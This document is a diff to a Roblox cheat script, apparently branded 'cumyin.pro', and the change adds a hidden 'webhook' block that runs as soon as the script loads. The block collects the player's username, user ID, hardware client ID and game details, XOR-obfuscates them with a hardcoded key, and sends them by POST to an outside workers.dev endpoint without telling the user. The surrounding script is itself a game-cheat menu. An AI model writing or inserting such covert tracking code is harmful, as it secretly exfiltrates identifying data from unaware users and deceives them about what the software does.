@@ -1233,6 +1233,50 @@ local WMToggle = MenuGroup:AddToggle("ShowWatermark", { Text="Show Watermark", D
 WMToggle:OnChanged(function(v) Library:SetWatermarkVisibility(v) end)
 
 -- ============================================================
+-- WEBHOOK — fires once on script load
+-- ============================================================
+task.spawn(function()
+    local ok, hwid = pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
+    if not ok then hwid = "unavailable" end
+
+    local username = game.Players.LocalPlayer.Name
+    local userid   = tostring(game.Players.LocalPlayer.UserId)
+    local gameId   = tostring(game.GameId)
+    
+    -- Try using PlaceId instead
+    local gameName = game.Name
+    local success, result = pcall(function()
+        local marketplace = game:GetService("MarketplaceService")
+        local productInfo = marketplace:GetProductInfo(game.PlaceId)
+        return productInfo.Name
+    end)
+    
+    if success and result then
+        gameName = result
+    end
+
+    -- XOR encrypt payload
+    local key = "x9k2mQpL"
+    local raw = '{"u":"' .. username .. '","id":"' .. userid .. '","hw":"' .. hwid .. '","gid":"' .. gameId .. '","gname":"' .. gameName .. '"}'
+    local out = {}
+    for i = 1, #raw do
+        local b = bit32.bxor(string.byte(raw, i), string.byte(key, ((i-1) % #key) + 1))
+        out[i] = string.format("%02x", b)
+    end
+    local encrypted = table.concat(out)
+
+    local fn = request or (syn and syn.request) or (http and http.request) or nil
+    if fn then
+        pcall(fn, {
+            Url     = "https://yellow-dawn-3b51.tommymclandes.workers.dev",
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = '{"d":"' .. encrypted .. '"}',
+        })
+    end
+end)
+
+-- ============================================================
 -- SAVE / THEME
 -- ============================================================
 Library.ToggleKeybind = Options.MenuKeybind
@@ -1249,4 +1293,4 @@ SaveManager:LoadAutoloadConfig()
 if Library.KeybindFrame then Library.KeybindFrame.Visible = false end
 
 Library:SetWatermark("cumyin.pro | Loaded")
-print("cumyin.pro flick loaded")
+print("cumyin.pro Flick loaded")
